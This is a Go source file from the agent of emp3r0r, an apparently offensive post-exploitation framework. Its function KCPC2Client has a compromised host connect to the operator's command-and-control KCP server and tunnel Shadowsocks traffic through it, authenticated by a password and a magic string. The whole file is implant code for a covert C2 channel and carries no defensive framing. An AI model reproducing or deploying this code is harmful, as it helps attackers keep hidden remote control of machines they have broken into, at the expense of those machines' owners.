package agent

import (
	"context"
	"fmt"
	"log"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

var (
	KCPC2Ctx    context.Context
	KCPC2Cancel context.CancelFunc
)

// Connect to C2 KCP server, forward Shadowsocks traffic
func KCPC2Client() {
	if !RuntimeConfig.UseKCP {
		return
	}
	// this context ends when agent exits
	KCPC2Ctx, KCPC2Cancel = context.WithCancel(context.Background())
	defer func() {
		log.Print("KCPC2Client exited")
		KCPC2Cancel()
	}()
	kcp_server_addr := fmt.Sprintf("%s:%s", RuntimeConfig.CCHost, RuntimeConfig.KCPServerPort)
	err := tun.KCPTunClient(kcp_server_addr, RuntimeConfig.KCPClientPort,
		RuntimeConfig.Password, emp3r0r_def.MagicString, KCPC2Ctx, KCPC2Cancel)
	if err != nil {
		log.Printf("KCPC2Client failed to start: %v", err)
	}
}
